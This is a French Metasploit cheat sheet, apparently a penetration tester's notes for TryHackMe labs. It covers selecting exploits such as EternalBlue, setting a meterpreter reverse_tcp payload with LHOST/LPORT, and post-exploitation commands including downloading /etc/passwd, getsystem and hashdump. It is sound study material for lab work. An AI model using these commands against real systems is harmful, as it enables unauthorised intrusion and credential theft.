---
tags: [tool, exploitation, post-exploitation]
tool_name: "Metasploit"
category: Exploitation
last_updated: 2024-01-01
---

# 🛠️ Metasploit Framework

## 📖 Description

> Framework d'exploitation open-source. Contient des centaines d'exploits, payloads et modules auxiliaires.

---

## 🚀 Démarrage

```bash
# Lancer msfconsole
msfconsole

# Initialiser la base de données (première fois)
msfdb init
```

---

## 📋 Commandes essentielles

### Recherche et sélection

```bash
# Rechercher un module
search <terme>
search type:exploit name:eternalblue
search cve:2021-44228

# Utiliser un module
use exploit/windows/smb/ms17_010_eternalblue
use 0   # (numéro du résultat de search)

# Infos sur le module actuel
info
```

### Configuration

```bash
# Voir les options requises
show options
show advanced

# Configurer les options
set RHOSTS 10.10.X.X
set LHOST 10.9.X.X    # ton IP VPN THM
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Voir les payloads compatibles
show payloads
```

### Lancement

```bash
# Vérifier si la cible est vulnérable (sans exploiter)
check

# Lancer l'exploit
run
exploit
```

### Meterpreter — Post-exploitation

```bash
# Infos système
sysinfo
getuid

# Navigation
pwd
ls
cd /tmp

# Upload / Download
upload /local/file.sh /tmp/file.sh
download /etc/passwd /local/passwd.txt

# Shell système
shell

# Élévation de privilèges
getsystem
hashdump

# Pivoting
run post/multi/recon/local_exploit_suggester
```

---

## 📋 Modules utiles

| Type | Module | Usage |
|------|--------|-------|
| Auxiliary | `scanner/portscan/tcp` | Scan de ports |
| Auxiliary | `scanner/smb/smb_ms17_010` | Check EternalBlue |
| Exploit | `multi/handler` | Recevoir un reverse shell |
| Post | `multi/recon/local_exploit_suggester` | Suggestions privesc |
| Post | `linux/gather/hashdump` | Dump des hashs Linux |

---

## 💡 Tips & astuces

- `multi/handler` pour recevoir des shells créés avec msfvenom
- `sessions -l` pour lister les sessions actives
- `sessions -i 1` pour interagir avec une session
- `background` pour mettre une session en arrière-plan

---

## 🔗 Ressources

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [HackTricks — Metasploit](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
